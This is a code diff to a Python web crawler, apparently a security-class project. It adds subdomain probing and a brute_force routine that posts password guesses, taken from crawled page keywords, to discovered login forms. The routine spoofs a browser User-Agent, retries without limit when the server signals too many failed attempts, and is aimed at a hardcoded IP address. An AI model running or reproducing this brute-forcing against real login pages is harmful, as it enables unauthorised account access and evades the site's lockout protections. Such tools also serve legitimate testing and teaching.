@@ -1,5 +1,5 @@
 from html_parser import HTMLParser
-from requests import get_request, post_request
+from requests import get_request, get_status, post_request
 from url_utils import extract_url_parts, reformat_url
 import collections
 import password_generator
@@ -114,33 +114,57 @@ def get_subdomains(url):
 
     return {subdomain + '.' + host for subdomain in subdomains}
 
-def web_crawler():
-    url = 'http://google.com'
-    url = reformat_url(url)
-    """
-    keywords_bfs, forms_bfs, seen_bfs = crawl_bfs(url, {})
-    print('\n\nKeywords:', keywords_bfs, '\n\nForm:', forms_bfs, '\n\nSeen:', seen_bfs, sep=' ')
-
-    print()
-
-    keywords_dfs, forms_dfs, seen_dfs = crawl_dfs(url, {})
-    print('\n\nKeywords:', keywords_dfs, '\n\nForm:', forms_dfs, '\n\nSeen:', seen_dfs, sep=' ')
-    """
-
-    print(get_subdomains(url))
-    """
+def crawl_subdomains(bfs, url, header_dict):
     for subdomain in get_subdomains(url):
         try:
-            #Test whether subdomain exists 
             conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            # Test whether subdomain exists 
             conn.connect((subdomain, 80))
-
-            crawl_bfs(subdomain, {})            
+            if bfs:
+                crawl_bfs(subdomain, header_dict)
+            else:
+                crawl_dfs(subdomain, header_dict)            
         except socket.gaierror:
             print('Subdomain ' + subdomain + ' was not found.')
         finally:
-            conn.close()
-    """
+            conn.close()    
+            
+def brute_force(user, passwords, forms, user_agent):
+    for form in forms:
+        print('\nAttempting to brute-force: ' + form + '\n')
+        get_header = {'User-Agent': user_agent}
+        html_doc = get_request(form, get_header)
+        parser = HTMLParser(html_doc)
+
+        for password in passwords:
+            login = parser.create_login_string(user, password)
+            post = {'User-Agent': user_agent,
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Content-Length': str(len(login))}
+
+            response = post_request(form, post, login)
+            
+            if get_status(response) >= 500:
+                print('Hold on, too many failed attempts! Waiting for the server to accept more login requests...')
+            
+            # Continually retry logging in if there is a server error (too many failed attempts)
+            while get_status(response) >= 500:
+                response = post_request(form, post, login)
+            print('Attempting to login...\nUser: ' + user + '\nPassword: ' + password)
+            if get_status(response) == 302:
+                print('Login Succeeded!\n')
+                break
+            else:
+                print('Login Failed...\n')
+          
+def web_crawler():
+    url = reformat_url('3.16.219.26')
+
+    keywords_bfs, forms_bfs, seen_bfs = crawl_bfs(url, {})
+
+    brute_force('user', keywords_bfs, forms_bfs, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246')
+
+
 if __name__ == '__main__':
     web_crawler()
     
